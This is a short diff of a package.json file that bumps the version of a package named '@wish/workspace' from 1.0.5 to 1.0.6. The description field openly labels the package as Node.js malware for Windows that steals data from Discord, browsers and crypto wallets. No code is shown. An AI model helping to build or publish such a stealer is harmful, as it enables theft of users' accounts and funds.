@@ -1,6 +1,6 @@
 {
     "name": "@wish/workspace",
-    "version": "1.0.5",
+    "version": "1.0.6",
     "description": "Node.js malware for Windows that extracts user data from Discord, browsers, crypto wallets, and more, affecting all users on every disk.",
     "exports": null,
     "type": "commonjs",
